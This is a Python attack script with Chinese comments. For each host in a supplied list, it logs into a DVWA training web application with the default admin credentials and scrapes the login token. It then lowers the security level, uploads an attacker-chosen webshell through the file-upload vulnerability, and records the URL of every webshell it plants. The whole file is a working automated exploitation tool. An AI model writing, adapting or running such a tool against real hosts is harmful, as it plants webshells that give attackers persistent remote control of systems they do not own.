from os import error
import requests,re,chardet
import argparse,json


#Web代理
dvwa_proxies={
    "http" : "http://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080",
}
# 添加选项
parser = argparse.ArgumentParser()
parser.add_argument("--file",type=str,dest="file",help="目标DVWA的文件",\
    default=None)
parser.add_argument("--webshell",type=str,dest="webshell",help="需要上传的webshell文件",\
    default=None)
args = parser.parse_args()
Url_file=args.file
Webshell=args.webshell


#登录dvwa
def Login():
    with open(Url_file,'r') as f:
        for i in f:
            try:
                login_url = str("http://"+i.strip()+"/login.php")
                dvwa_headers = {
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate",
                        "DNT": "1",
                        "Origin": login_url,
                        "Connection": "close",
                }
                print("[+ 即将攻击的目标：]"+login_url)
                #获取token
                s = requests.session()
                r = s.get(login_url, headers = dvwa_headers,verify=False,allow_redirects=True,timeout=2)
                html = r.content
                print("[+ 网站正常]:"+str(r.status_code) + " " +login_url)
                encode_type = chardet.detect(html)
                html = html.decode(encode_type['encoding'])
                reg = r"<input type='hidden' name='user_token' value='(.*)' />"
                pattern = re.compile(reg)
                result = pattern.findall(html)
                token = result[0]
                print("[+ 成功获取Token]:"+str(token))
                login_data = {
                    "username" : "admin",
                    "password" : "password",
                    "Login" : "Login",
                    "user_token" : token,
                }
                sec_data ={
                    "security":"low",
                    "seclev_submit":"Submit",
                    "user_token":token,
                }
                file_data = {
                    "MAX_FILE_SIZE":"100000",
                    "Upload":"Upload",
                    "filename":"Test.php",
                }
                files = {
                    "uploaded":("Test.php",
                            open(Webshell,"rb"),
                            "x-php",
                    )
                }
                #登录
                r_login = s.post(login_url,headers=dvwa_headers,data=login_data,\
                    proxies=None,verify=False,timeout=2)
                if r_login.status_code == 200:
                    print("[+ 登录成功！]"+i)
                r_submit_low = s.post("http://"+i.strip()+"/security.php",headers=dvwa_headers,data=sec_data,\
                    proxies=None,verify=False)
                if "Location: security.php" in r_submit_low.headers:
                    print("[+ 安全设置完成！]" + i)
                #上传
                r_upload =s.post("http://"+i.strip()+"/vulnerabilities/upload/",headers=dvwa_headers,files=files,data=file_data,\
                    proxies=None,timeout=3,verify=False)
                if "uploads/Test.php" in r_upload.text:
                    sucess_url ="http://"+i.strip()+"/hackable/uploads/"+str(Webshell)
                    print("[+ 成功上传！]"+ sucess_url)
                    with open("Webshells_list.txt","a") as z:
                        z.write(sucess_url+'\n')
            except :
                print("[- 无法链接!]" + i)
                pass
            continue
    

if __name__=="__main__":
    Login()